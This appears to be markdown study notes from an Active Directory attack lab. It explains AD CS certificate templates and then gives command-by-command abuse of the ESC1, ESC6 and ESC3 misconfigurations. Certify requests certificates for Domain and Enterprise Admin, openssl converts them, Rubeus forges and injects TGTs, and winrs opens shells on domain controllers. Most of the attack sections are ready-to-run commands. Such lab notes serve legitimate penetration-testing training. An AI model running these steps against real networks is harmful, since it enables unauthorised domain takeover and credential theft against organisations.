# AD CS
Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest. AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more. AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization.

## Certificate Template
Certificate templates in Active Directory Certificate Services (AD CS) are preconfigured certificate request templates that define the properties and characteristics of certificates issued by the AD CS infrastructure. These templates serve as blueprints for generating and managing various types of certificates within an organization.They define key elements such as certificate purpose, key usage, validity period, subject name format, and other extensions. By using certificate templates, administrators can simplify the process of requesting and issuing certificates, ensuring compliance with security policies and regulatory requirements.

## AD CS components

- CA(Certificate Autority): Here, the server with the AD CS role is the certificate authority, usually DC is the certificate authority. Certificate Authority issues the certificate.
- Certificate: This is issued to the user or machine by the CA and can be used for authentication, encryption, signing, etc
- CSR(Certificate Signing Request or asking for a certificate): This is Certificate Signing Request made by the client to the Certificate Authority(CA) to request a certificate.
- Certificate Template: It defines settings for a certificate. Contains information like enrolment permission, EKUs, expiry, etc
- EKU OIDs: Extended Key Usage Object Identifiers. These dictate the use of a certificate template(client authentication, smart card logon, subCA, etc)

## Working 
- The client generates public/private key pair
- Client sends Certificate Signing Request(CSR) to the CA(Certificate Authority) which contains the template(eg: for code signing), Subject(user who requested), EKU and their public key
- The CA(Certificate Authority) verifies the CSR if the template exists, If the user requires approval, if the user has permission and so on.
- The CA generates a certificate and signs it using the CA private key.
- CLient stores the certificate in Windows Certificate Store and uses it for their purpose.

## Abusing AD CS
- Extracting user and machine certificates
- Use the certificates to retrive NTLM hash
- User and machine level persistance
- Escalation to Domain Admin and Enterprise Admin
- Domain persistance

## We can use the Certify tool (https://github.com/GhostPack/Certify) to enumerate (and for other attacks) AD CS in the target forest:
```
certify.exe cas
```
## Enumerate vulnerable templates:
```
Certify.exe find /vulnerable
```
## Common Vulnerable scenrios

- Any certificate template which allows domain users enrollment rights along with pkiextendedkeyusage property as Certificate Request Agent is considered vulnerable which allows to request certificate on behalf of other users.

- CA allows normal/low privileged user enrollment rights Allow Enroll: NT Authority\ Authenticated Users

## ESC1(Enrolee can request cert for ANY user)
This allows escalation of privilege for a domain admin since enrolee can request certificate for a domain admin.
```
Certify.exe find /enrolleeSuppliesSubject
```
Check for properties msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT then check Enrollment Rights property if we can see our user or group where our compromised user is a part of. The template "HTTPSCertificates" allows enrollment to the RDPUsersgroup.Request a certificate for DA (or EA) as student

```
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```
Now copy paste the certificate and save as anything.pem and convert this pem to pfx using windows version of openssl.
```
openssl.exe pkcs12 -in C:\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\Tools\esc1.pfx
```
Enter password as anything and Ignore the unable to write 'random state' message and use Rubeus to request TGT for Domain Administrator or the Enterprise Administrator
```
Rubeus.exe asktgt /user:administrator /certificate:C:\Tools\esc1.pfx /password:SecretPass@123 /ptt
```
```
winrs -r:dcorp-dc cmd
```

## Same way we can also request certificate for the administrator of mneycorp.local also called Enterprise Administrator here only difference is the altname parameter.
```
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
```
```
openssl.exe pkcs12 -in C:\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\Tools\esc1-EA.pfx
```
- Note the dc parameter here.
```
Rubeus.exe asktgt /user:moneycorp.local/Administrator /dc:mcorp-dc.moneycorp.local /certificate:C:\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt
```
```
winrs -r:mcorp-dc cmd
```

## ESC6(EDITF_ATTRIBUTESUBJECTALTNAME2 setting on CA -Request certs for ANY user)

If the certificate authority(CA) has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set. This means that we can request a certificate for ANY user from a template that allow enrollment for normal/low-privileged users. Here, the template "CA-Integration" grants enrollment to RDPUsers group. Request certificate as DA or EA as student user.
```
Certify.exe find
```
```
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altname:administrator
```
- Convert from cert.pemto pfx(esc6.pfx below) and use it to request a TGT for DA (or EA).
```
Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:SecretPass@123 /ptt
```

## ESC3 (Request an enrollmentagent certificate and use it to request cert on behalf of ANY user)
If a template allows Domain users to enroll and has "Certificate Request Agent" EKU. 
```
Certify.exe find /vulnerable
```
if a template has an Application Policy Issuance Requirement of Certificate Request Agent and has an EKU that allows for domain authentication. Search for domain authentication EKU:
 ```
Certify.exe find /json /outfile:C:\AD\Tools\file.json 
 ```
 ```
((Get-Content C:\AD\Tools\file.json | ConvertFrom-Json).CertificateTemplates | ? {$_.ExtendedKeyUsage -contains "1.3.6.1.5.5.7.3.2"}) | fl * 
 ```
 - Escalation to DA
 ```
 Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
 ```
 - Convert from cert.pemto pfx(esc3agent.pfx below) and use it to request a certificate on behalf of DA using the "SmartCardEnrollment-Users" template.
 ```
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA/template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator/enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
 ```
- Convert from cert.pemto pfx(esc3user-DA.pfx below), request DA TGT and inject it:
```
Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt
```
